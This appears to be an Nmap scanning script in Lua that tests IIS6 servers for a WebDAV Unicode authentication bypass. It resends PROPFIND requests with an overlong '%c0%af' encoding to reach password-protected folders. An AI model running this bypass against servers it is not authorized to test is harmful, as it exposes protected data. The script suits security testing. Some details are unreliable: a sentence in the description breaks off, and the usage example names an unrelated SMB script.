description = [[
Checks for a vulnerability in IIS6 that allows arbitrary users to access secured WebDAV folders by searching for a password-protected folder and attempting to access it. As of May 2009, this vulnerability is unpatched. 

A list of well known folders (almost 900) is used by default. Each one is checked, and if returns an authentication request (401), another attempt is tried with the malicious encoding. If that attempt returns a successful result (207), 

The module is based on Metasplit's auxiliary module, modules/auxiliary/scanner/http/wmap_dir_webdav_unicode_bypass.rb. 
]]

---
-- @usage
-- nmap --script smb-enum-users.nse -p445 <host>
--
-- @output
-- 80/tcp open  http    syn-ack
-- |_ http-webdav-unicode-bypass: Vulnerable folders discovered: /secret, /webdav
--
-- @args webdavfolder Selects a single folder to use, instead of using a built-in list
-- @args folderdb The filename of an alternate list of folders.
-- @args basefolder The folder to start in; eg, "/web" will try "/web/xxx"
-----------------------------------------------------------------------

author = "Ron Bowes <ron@skullsecurity.net> and Andrew Orr"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery"}

require "http"
require "nsedebug"
require "shortport"

portrule = shortport.port_or_service({80, 8080}, "http")

---Enumeration for results
local enum_results = 
{
	VULNERABLE = 1,
	NOT_VULNERABLE = 2,
	UNKNOWN = 3
}

---Sends a PROPFIND request to the given host, and for the given folder. Returns a table reprenting a response. 
local function get_response(host, port, folder)
	local webdav_req = '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>'

	local mod_options = {
		header = {
			Host = host.ip,
			Connection = "close",
			["User-Agent"]  = "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)",
			["Content-Type"] = "application/xml",
		},
		content = webdav_req
	}

	return http.request(host, port, "PROPFIND " .. folder .. " HTTP/1.1\r\n", mod_options)
end

---Check a single folder on a single host for the vulnerability. Returns one of the enum_results codes. 
local function go_single(host, port, folder)
	local response

	response = get_response(host, port, folder)
	if(response.status == 401) then
		local vuln_response

		stdnse.print_debug(1, "http-webdav-unicode-bypass: Found protected folder (401): %s", folder)

		vuln_response = get_response(host, port, "/%c0%af" .. string.sub(folder, 2))
		if(vuln_response.status == 207) then
			stdnse.print_debug(1, "http-webdav-unicode-bypass: Folder seems vulnerable: %s", folder)
			return enum_results.VULNERABLE
		else
			stdnse.print_debug(2, "http-webdav-unicode-bypass: Folder not vulnerable: %s", folder)
			return enum_results.NOT_VULNERABLE
		end
	else
		stdnse.print_debug(3, "http-webdav-unicode-bypass: Not a protected folder (%s): %s", response['status-line'], folder)
		return enum_results.UNKNOWN
	end
end

---Checks a list of possible folders for the vulnerability. Returns a list of vulnerable folders. 
local function go(host, port)
	local status, folder
	local results = {}
	local is_vulnerable = true

	local folder_file
	if(nmap.registry.args.folderdb ~= nil) then
		folder_file = nmap.fetchfile(nmap.registry.args.folderdb)
	else
		folder_file = nmap.fetchfile('nselib/data/folders.lst')
	end

	if(folder_file == nil) then
		return false, "Couldn't find folders.lst (should be in nselib/data)"
	end

	local file = io.open(folder_file, "r")
	if not file then
		return false, "Couldn't find folders.lst (should be in nselib/data)"
	end

	while true do
		local result
		local line = file:read()
		if not line then
			break
		end

		if(nmap.registry.args.basefolder ~= nil) then
			line = "/" .. nmap.registry.args.basefolder .. "/" .. line
		else
			line = "/" .. line
		end

		result = go_single(host, port, line)
		if(result == enum_results.VULNERABLE) then
			results[#results + 1] = line
		elseif(result == enum_results.NOT_VULNERABLE) then
			is_vulnerable = false
		else
		end
	end

	file:close()

	return true, results, is_vulnerable
end

action = function(host, port)
	-- Start by checking if '/' is protected -- if it is, we can't do the tests
	local result = go_single(host, port, "/")
	if(result == enum_results.NOT_VULNERABLE) then
		return "Could not determine vulnerability, since root folder is password protected"
	end

	if(nmap.registry.args.webdavfolder ~= nil) then
		local folder = nmap.registry.args.webdavfolder
		local result = go_single(host, port, "/" .. folder)

		if(result == enum_results.VULNERABLE) then
			return string.format("Folder is vulnerable: %s", folder)
		elseif(result == enum_results.NOT_VULNERABLE) then
			return string.format("Folder is NOT vulnerable: %s", folder)
		else
			return string.format("Could not determine vulnerability of folder: %s", folder)
		end
		
	else
		local status, results, is_vulnerable = go(host, port)
	
	    if(status == false) then
			return "ERROR: " .. results
		else
			if(#results == 0) then
				if(is_vulnerable == false) then
					return "Server does not appear to be vulnerable."
				else
					return "No vulnerable folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>"
				end
			else
				return "Vulnerable folders discovered: " .. stdnse.strjoin(", ", results)
			end
		end
	end
end

